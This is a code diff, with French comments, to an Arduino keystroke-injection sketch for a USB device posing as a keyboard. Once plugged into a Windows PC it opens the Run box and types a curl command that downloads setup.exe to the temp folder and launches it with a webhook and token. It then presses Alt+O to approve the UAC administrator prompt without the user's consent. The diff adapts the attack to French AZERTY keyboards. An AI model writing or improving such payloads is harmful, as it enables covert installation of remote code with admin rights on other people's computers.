@@ -1,4 +1,7 @@
-#include <Keyboard.h>
+// Librairie requise : HID-Project by NicoHood
+// Arduino IDE → Gestionnaire de bibliotheques → rechercher "HID-Project" → Installer
+#include <HID-Project.h>
+#include <HID-Settings.h>
 
 // ─── A configurer avant de flasher ───────────────────────────────────────────
 #define WEBHOOK   "VOTRE_WEBHOOK_ICI"
@@ -9,46 +12,27 @@
 #define BOOT_DELAY  3500
 
 // Delai apres la commande avant d'accepter l'UAC (ajuster selon vitesse reseau)
-// 8000ms = ok pour connexion rapide, monter a 15000 si le reseau est lent
+// 8000ms = ok connexion rapide, monter a 15000 si lent
 #define UAC_DELAY   8000
-
-// Touche UAC : 'o' = Oui (Windows FR/AZERTY), 'y' = Yes (Windows EN/QWERTY)
-#define UAC_KEY     'o'
 // ─────────────────────────────────────────────────────────────────────────────
-
-void pressKey(uint8_t modifier, uint8_t key) {
-  if (modifier) Keyboard.press(modifier);
-  Keyboard.press(key);
-  delay(80);
-  Keyboard.releaseAll();
-  delay(60);
-}
-
-void switchToQwerty() {
-  // Alt+Shift bascule vers le layout suivant (generalement EN-QWERTY sur Windows FR).
-  // Necessite qu'Anglais soit installe comme langue supplementaire dans Windows
-  // (c'est le cas par defaut sur la plupart des Windows FR).
-  Keyboard.press(KEY_LEFT_ALT);
-  Keyboard.press(KEY_LEFT_SHIFT);
-  delay(100);
-  Keyboard.releaseAll();
-  delay(600); // Laisser Windows appliquer le changement
-}
 
 void setup() {
   delay(BOOT_DELAY);
-  Keyboard.begin();
 
-  // Forcer le layout QWERTY avant de taper pour que les caracteres speciaux
-  // (\ % " &) soient correctement interpretes quel que soit le layout par defaut
-  switchToQwerty();
+  // KeyboardLayout_fr_FR : HID-Project envoie les keycodes AZERTY corrects
+  // pour chaque caractere. Le PC cible en AZERTY reçoit exactement le bon caractere,
+  // sans que Windows ait besoin de re-mapper quoi que ce soit.
+  Keyboard.begin(KeyboardLayout_fr_FR);
 
-  // Ouvrir la boite Executer (Win+R)
-  pressKey(KEY_LEFT_GUI, 'r');
+  // Win+R — ouvrir la boite Executer
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  delay(100);
+  Keyboard.releaseAll();
   delay(900);
 
-  // Telecharger setup.exe depuis GitHub Releases et le lancer avec les credentials
-  // Le setup.exe a un manifest requireAdministrator : il declenchera l'UAC lui-meme
+  // Commande : telecharger setup.exe et le lancer avec les credentials
+  // setup.exe a un manifest requireAdministrator → declenchera l'UAC lui-meme
   Keyboard.print("cmd /c curl -sLo %TEMP%\\s.exe ");
   Keyboard.print(SETUP_URL);
   Keyboard.print(" && %TEMP%\\s.exe -w \"");
@@ -57,16 +41,17 @@ void setup() {
   Keyboard.print(TOKEN);
   Keyboard.print("\"");
   delay(100);
-  pressKey(0, KEY_RETURN);
+  Keyboard.press(KEY_RETURN);
+  Keyboard.releaseAll();
 
-  // Restaurer le layout d'origine (Alt+Shift en sens inverse)
-  switchToQwerty();
-
-  // Attendre : ouverture cmd + telechargement setup.exe + apparition UAC
+  // Attendre : ouverture cmd + telechargement + apparition UAC
   delay(UAC_DELAY);
 
-  // Accepter l'UAC via le raccourci clavier Alt+O (FR) ou Alt+Y (EN)
-  pressKey(KEY_LEFT_ALT, UAC_KEY);
+  // Alt+O → accepter l'UAC "Oui" en français
+  Keyboard.press(KEY_LEFT_ALT);
+  Keyboard.press('o');
+  delay(100);
+  Keyboard.releaseAll();
 
   Keyboard.end();
 }
